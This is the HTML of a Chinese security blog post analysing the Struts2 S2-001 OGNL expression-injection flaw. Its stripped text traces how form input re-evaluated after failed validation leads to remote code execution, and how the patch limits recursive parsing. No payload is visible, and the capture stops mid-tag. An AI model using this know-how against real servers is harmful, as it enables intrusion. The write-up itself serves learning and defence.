<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Java反序列化入门之S2-001分析 | hybcx</title><meta name="keywords" content="Java反序列化"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Java反序列化入门之S2-001分析"><meta name="application-name" content="Java反序列化入门之S2-001分析"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Java反序列化入门之S2-001分析"><meta property="og:url" content="http://hybcx.xyz/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 前言 跟着师傅的指导，再来看看Structs2的漏（最近hvv也一直背的面经）。最近学习路上总是emo，发现自己以前学的不扎实，而且串联不起来，很混乱，目前还没找到解决的办法，只能说，先认真对待当下的每一次所学习的东西。日后在整理一下思绪。 0x02 概述 自 Struts2 在 2007"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 前言 跟着师傅的指导，再来看看Structs2的漏（最近hvv也一直背的面经）。最近学习路上总是emo，发现自己以前学的不扎实，而且串联不起来，很混乱，目前还没找到解决的办法，只能说，先认真对待当下的每一次所学习的东西。日后在整理一下思绪。 0x02 概述 自 Struts2 在 2007"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'Java反序列化入门之S2-001分析',
  postAI: '',
  pageFillDescription: '0x01 前言, 0x02 概述, 0x03 前置知识, OGNL 简介, OGNL 三要素, ValueStack, 值栈的作用, request中获取值栈, ActionContext中获取值栈, Struts2 执行流程, 0x04 漏洞分析, 漏洞环境搭建, 漏洞复现, 漏洞分析, 问题一, 问题二, 0x05 漏洞修复, 总结, 0x06 Poc采集, 0x07 参考文章前言跟着师傅的指导再来看看的漏最近也一直背的面经最近学习路上总是发现自己以前学的不扎实而且串联不起来很混乱目前还没找到解决的办法只能说先认真对待当下的每一次所学习的东西日后在整理一下思绪概述自在年爆出第一个远程代码执行漏洞以来在其后续的发展过程中不断爆出更多而且危害更大的远程代码执行漏洞而造成这么多漏洞的主要原因就是表达式这里以的第一个漏洞为例来对远程代码执行漏洞进行学习在这之前也是简单过了一下等基础希望接下来分析能够顺利些前置知识简介首先来了解表达式的中文全称为对象图导航语言是应用于中的一个开源的功能强大的表达式语言它被集成在等框架中通过简单一致的表达式语法可以存取对象的任何属性调用对象的方法遍历整个对象的结构图实现字段类型转化等功能进行对象存取操作的在文件中分别是两个方法通过传入的表达式在给定的上下文环境中从对象里取值创建一个类定义一个类最后一个类分别定义相应的属性并设置方法之后添加包作为相应的库随后在定义一个类一中三班分别给对应的属性赋值接着我们是想要获取到其中的属性值我们可以与传统的方法比较一下如果想要获取属性值就需要实例化对应类然后调用方法但如果使用的方法就只需要传递一个表达式和根节点就能取出指定对象的属性值三要素具有三要素表达式根对象和上下文对象表达式表达式是整个的核心通过表达式来告诉需要执行什么操作根对象可以理解为的操作对象可以对进行取值或写值等操作表达式规定了做什么而根对象则规定了对谁操作实际上根对象所在的环境就是的上下文对象环境上下文对象可以理解为对象运行的上下文环境以的结构利用键值对关系来描述对象中的属性以及值这样不难知道的是包含的中的即为的又称其中包含的即为的该包含的对象如图值栈就是表达式存取数据的地方在一个值栈中封装了一次请求所需要的所有数据在使用的项目中会为每个请求创建一个新的值栈也就是说值栈和请求是一一对应的关系这种一一对应的关系使值栈能够线程安全地为每个请求提供公共的数据存取服务值栈的作用值栈可以作为一个数据中转站在前台与后台之间传递数据最常见的就是将的标签与表达式结合使用值栈实际上是一个接口在中利用时实际上使用的就是实现了该接口的类这个类是的基础值栈贯穿整个的生命周期每个类的对象实例都拥有一个对象在对象中保存了当前对象和其他相关对象要获取值栈中存储的数据首先应该获取值栈值栈的获取有两种方式具体如下中获取值栈对象在范围内的存储方式为可以通过如下方式从中取出值栈的信息获取对象通过对象获取在上述示例代码中是类中的常量它的值为中获取值栈在使用框架时可以使用操作对象从中存取数据也就是说可以从对象中获取对象实际上框架中的对象就是获取对象的方式如下所示通过获取对象对象是在的方法中被创建的在源码中用于创建对象的方法内可以找到获取的对象的信息方法中还有这样一段代码从上述代码中可以看出对象中的对象被作为参数传递给了对象这也就说明对象中持有了对象的引用因此可以通过对象获取对象执行流程首先来简单了解的执行流程官方提供的的架构如图在该图中一共给出了四种颜色的标识其对应的意义如下橙色过滤器所有的请求都要经过过滤器的处理浅蓝色的核心部分浅绿色的拦截器浅黄色需要开发人员创建的部分图中的一些组件的作用如下是整个的调度中心也就是整个架构中的它根据的结果来决定是否处理请求用来判断传入的请求是否被处理如果需要处理的话就会返回一个对象来描述请求对应的的信息用来创建一个代理实例它位于和之间是配置的管理中心可以把它当做已经读取到内存中的配置文件是的应用配置文件负责诸如与之间映射的配置以及执行后页面跳转的配置等用来真正的调用并执行拦截器和对应的作用类似于一个调度器拦截器可以自动拦截主要在运行之前或者运行之后来进行执行开发者可以自定义是中的动作执行单元用来处理用户请求并封装业务所需要的数据是不同视图类型的抽象封装模型不同的视图类型会对应不同的实现中支持多种视图类型比如等各种视图类型的页面模板比如就是一种模板页面技术的标签库它抽象了三种不同的视图技术可以在不同的视图技术中几乎没有差别的使用这些标签接下来我们可以结合上图来了解下框架是如何处理一个请求的当请求发送到服务器之后服务器根据用户的请求以及中的配置文件将请求转发给框架进行处理请求经过一系列的过滤器最后到达过滤器将请求转发给判断该请求是否需要处理如果该请求需要处理会创建一个来进行后续的处理拿着请求询问该调用哪一个进行处理当知道目标之后实例化一个来进行调用然后运行在之前的拦截器图中就是拦截器运行生成一个根据页面模板和标签库生成要响应的内容根据响应逆序调用拦截器然后生成最终的响应并返回给服务器漏洞分析官方公告漏洞影响范围的漏洞原理是模板文件中引用了不合适的标签进行渲染并且渲染的值是用户可控的此时则达成了表达式注入的目的漏洞环境搭建这个插件最新版首先在安装插件官方说之后就不在支持该插件这里我是版本这里在搭建环境也是遇到众多问题因为现在的文章都是几年前的也是老版本对于我这个玩不明白的人也是很费劲搜了众多文章总算是解决了首先如上图所示创建一个新项目即可新版不能直接创建接着创建好的项目添加技术框架支持红色方框这里应该是有个应用程序的我这里已经添加过因此不显示接着选中设置稍后设置库下载在项目目录下新建文件夹将所需要的包从下载目录中导入到文件夹下将全部包选中右键所需要的包如上图所示下面的由于已经创建过就借用个图选中以上包添加为库即可名字任意接着在项目结构的工件处将该项目至于最后创建版本在左右即可设置好之后在部署那一栏添加相应的可能不够详细之后会放参考文章最后点击右上角的启动即可成功的话会直接跳转到相应但如果显示不成功除了程序本身的配置问题看一下是否是使用了协议这里我们默认是因此你需要修改为协议最后项目结构以及成功结果如下图所示因为漏洞是在表单验证失败时发生的这里继续编写一个表单验证的以复现漏洞在目录下修改然后新建在下新建修改之后刷新运行成功的话会出现登录漏洞复现获取路径这里或者查看源码才能看到回显的路径或者登录框获取目录执行命令漏洞分析上面的漏洞复现有个特性就是如果我们输入错的内容在输入框那会保留错误的信息如下图发现错误的时候输入的内容没有被清空接下来输如下图发现被解析成从而利用这一特性可以构造一些命令执行语句该漏洞是因为用户提交表单数据并且验证失败时后端会将用户之前提交的参数值使用表达式进行解析然后重新填充到对应的表单数据中我们在表达式原生处下断点该方法用于解析表达式并返回表达式的值在输入框中输入之后不断步出知道此时的调用栈就是漏洞发生的整个过程下面我们就来逐步分析一下首先判断是在何时被执行的我们将断点设置在的和方法上然后根据最开始的工作流程图可以知道在一个请求进来后会经过一系列的拦截器这些拦截器可以是自带的也可以是用户自定义的例如文件中的继承自而就使用了自带的拦截器在中可以找到默认使用的拦截器栈在拦截器栈中我们需要关注这个拦截器其中拦截器会将客户端请求数据设置到值栈中后续页面中所有的动态数据都将从值栈中取出该拦截器对应的权限定类名是该拦截器会通过调用对应的方法来为其属性进行赋值最后对赋值进行判断如果的值为则证明代码执行的行为发生在执行之后如果的值为则证明代码执行的行为发生在执行之前通过这种简单的判断就可以减少漏洞点的搜索范围如上图当我们发送发现复制完成之后值仍然是原型这意味着代码执行的行为发生在之后意味着截止到执行完拦截器为止没有代码执行的行为发生接下来是执行的方法最终结果是返回字符串根据整体执行流程执行完毕后的步骤是操作对应的模板页面当的方法返回字符串时要去解析的模板页面是支持多种模板引擎只是其中一种所以在真正开始解析之前还需要判断开发人员使用的模板引擎种类从而调用对应的类和方法负责处理的类是解析会从第一个标签即开始当解析到类时首先被调用的方法就是方法该方法的代码如下图所示除方法外中还有一个方法一个是解析标签开始时调用另一个是解析到标签闭合时调用问题一这里看了网上很多文章可能是我基础不太行加上众多师傅选择的依赖包版本是而这里我是于是找调试入口点就找了半天无从下手这里也是选择了一种调试的方法结合多个文章吧我们先在自定义的处下个断点用来截停分析接受页面传来的数据点击就会发现代码断点处接受到了传来的数据从这里开始网上的很多文章就直接看调用栈了说是下图中的类中反射调用了我们自定义的类路径但我直接跟进却看不出个所以然这里我认为有两种办法一个就是一个个点击调用栈寻找谁调用了这个类方法或者就是直接跟随看一下各个参数的数据寻找关键字如下图可以看到这里的顾名思义或者看代码就能知道通过调用了我们的自定义类同时也能看到这里的值是方法也就是执行类下的方法接下来可能就是马后炮了网上的文章是根据执行流程来分析整条链子应该是经验丰富导致的思路而对我这个小白很茫然但我们不妨先跟着师傅们分析一下随后看看有什么课后感想根据其框架流程图我们知道当接受了一个请求之后会先经过一系列拦截器的执行首先就是参考里面的代码如下图所示先是继承了一个这个自带的默认拦截器我们找一下相应的文件根据文章以及上面的分析我们也知道这里要关注的是这个拦截器其中拦截器会将客户端请求数据设置到值栈中后续页面中所有的动态数据都将从值栈中取出那这一点我们如何来验证呢下个断点即可至于为什么是这个方法我想是因为函数名称来定位的这里顾名思义就是参数拦截器而我们恰好是要找拦截器并且其中的代码块也涉及到了栈以及我们自定义的出现我们下一个断点先如上图可以看到这里的函数参数中存在着与显然这证明了我们客户端存入的数据被存入了的值栈中接着我们跟进对应的函数上面的逻辑先是正常赋个值值默认就是看一下这里的根据回答这个类就是将传入的类对象按照对象自身的规则对这些键值对进行排序然后赋值给接着通过方法获取中的全部键值对这里看一下的逻辑通过上面的迭代器调用获取当前条目然后强转一下调用的获取当前条目的键随后通过一条语句给赋值看一下逻辑根据这里就是判断的值是否含有特殊字符函数内部使用多个方法检查字符串是否包含某些特殊字符码值即和如果字符串包含这些特殊字符中的任何一个则该函数返回否则返回具体来说方法用于查找指定字符第一次出现在字符串中的位置如果未找到该字符则返回这里我们检查中是否包含特定字符如果没有找到就返回表示不包含该字符继续执行下一个检查因此这段代码实际上是判断字符串中是否包含特定字符和如果字符串中包含这些特殊字符则返回否则返回显然这里我们的是这样的话就能跳出循环接着通过得到的值最后调用的将我们输入的数据放入了值栈这里可以跟进看一下大体就能知道个逻辑现在我们回顾最开始的分析可以确定这里在最后压入值栈的时候的值还未被解析这意味着这段代码的解析肯定是处于这些拦截器之后的也就是说漏洞点发生在我们自定义执行之后现在我们就理解了为何上述会去先判断漏洞发生点不然范围太大了那接下来就是分析之后的代码了回到我们自定义的我们知道根据我们传入的数据这里最后肯定返回的是字符串我们看一下对应的处理办法可以看到转到进行处理我们的是从输入的这里需要了解的是的本质也是一个在执行的时候会将其转化为代码比如这里被转化为负责处理的类是解析会从第一个标签即开始当解析到类时首先被调用的方法就是方法该方法的代码如下图所示除方法外中还有一个方法一个是解析标签开始时调用另一个是解析到标签闭合时调用路径是一个抽象类由于首先被解析的是一个标签有一个与标签对应的实体类类名为是的子类虽然当前断点设置在的方法上其实是子类在调用父类方法因为当前对象是对象接下来就是重点分析标签后面的标签这两个标签的具体写法如图接下来我们别事后诸葛亮先从开始分析上述的调用函数传入的参数为值栈对象请求对象相应对象最后会返回一个对象这里暂时没看出什么可疑点下面两幅图片是中具体的实现代码也是没有可疑点似乎就是单纯的设置属性随后调用函数不过这里恒为接着进入语句调用依旧恒为也就是这个始终返回接着分析首先跟进函数这里继续调用了继续跟进这个函数前半部分逻辑清晰就是添加相应的参数键键值接着分析下半部分这里先展示了两个函数一个返回恒为一个返回恒为的类对象根据上面两个函数这意味着我们一定会进入第二个语句由于的值为因此进入语句这里的就是我们的字符串根据下面两个图片我们知道恒为这意味着最终的值会是值周围添加指定符号构成表达式接着就是添加属性这其中调用了来寻找也就是字符串对应的值跟进去看看如上图最终是一定会进入方法传入三个参数以及值栈这里继续调用了重载函数无他继续跟进这里我认为就是关键的点了分析一下这里执行逻辑函数是用于获取字符串中指定索引位置的字符的方法它属于类的成员方法可以通过字符串对象调用首先就是定义某些参数这里代码能看懂但是不知道具体含义是什么看了文章发现是用来判断与符号数量是否一致如果一致那最终就是估计是为了符合表达式要求这里最终会由于跳出这个循环来到下图这里尝试返回对应的值赋值给对象这里我还没赋值我们假设这里值为那的值就不是然后这里的由于肯定为也就是最终的就会造成接着按照上图跟进此时发现进入到的也就是处理表达式的类这里利用参数被强转为之后调用方法之后来到语句由于恒为于是直接执行最下面的如下图先是设置上下文的当前对象以及当前节点最终会调用方法继续跟进接着就是表达式的底层逻辑了这里先不分析表达式漏洞我们只需要知道在方法中先是取出表达式这里就是得到第一个节点这里显示接着进入循环继续遍历第二个节点随后再取出来将得到的结果调用函数逻辑似乎就是相加相加得到也就是表达式的解析执行至此漏洞分析也就结束了问题二虽然分析了上述漏洞但其实也知道根本上还是因为表达式的注入漏洞因此我认为还需要具体分析一下表达式借助一个下断点跟进往下调试看到调用了函数该函数将传入的类型的字符串解析为表达式能理解的类型到达下图发现参数被强转为调用了传入的参数为当前上下文以及根对象继续跟进发现调用了继续跟进这里跟进到了方法这里看逻辑是对当前对象所拥有的节点进行的处理继续跟进发现到了如下图所示的地方对当前根节点调用跟进之后又来到重载方法跟进发现调用了如下图可以看到这里调用了获得当前的对象也就是的类对象继续跟进调用重载函数调用了来获取当前类对象的方法继续跟进调用了最终是调用了方法执行函数来实例化类至此第一部分节点分析完成接下来分析方法是如何传入进去的也就是第二个节点分析路径基本一样只是调用的相关重载函数不一致按照节点一的思路持续跟进最终来到这里发现调用方法进一步调用无脑跟进最终看到再次调用执行了实例的方法并传入了参数弹出计算器至此最终函数调用栈如下简单地说表达式的解析过程就是先将整个表达式按照语法树分为几个子节点树然后循环遍历解析各个子节点树上的表达式其中通过即反射的方式实现任意类方法调用将各个节点解析获取到的类方法通过链的方式串连起来实现完整的表达式解析得到完整的类方法调用漏洞修复这里在分析修复前后的代码又遇到了小小问题发现对漏洞产生还是有点不清楚但继续重新调试终于明白附上修复和修复前的代码借个图可以看到上述增加了一个判断根据文章所说这里是递归解析次数的判断默认情况下仅解析第一层对于这种修复解释我们先看一下漏洞执行逻辑首先是解析执行是一个表达式会进行表达式解析执行最终就是来获取的值也就是最终成为因为我们设置的就是由于修复前的代码用的是循环因此又会去递归解析这个又认为是表达式最终解析为但修复后的进行了判断递归解析次数因此如果还是上述情况会在解析的时候判断次数上限退出循环也就不会被执行了总结经过上述漏洞的分析可以看到漏洞点就在于对用户输入的数据没有做出合理判断导致在解析表达式的时候在其中的循环递归解析了表达式导致任意代码执行采集回显调试获取路径参考文章安全之漏洞分析表达式注入漏洞总结安全入门漏洞分析漏洞分析环境搭建可参考表达式注入漏洞总结代码审计之安全入门之漏洞分析',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-04-23 16:42:22',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" 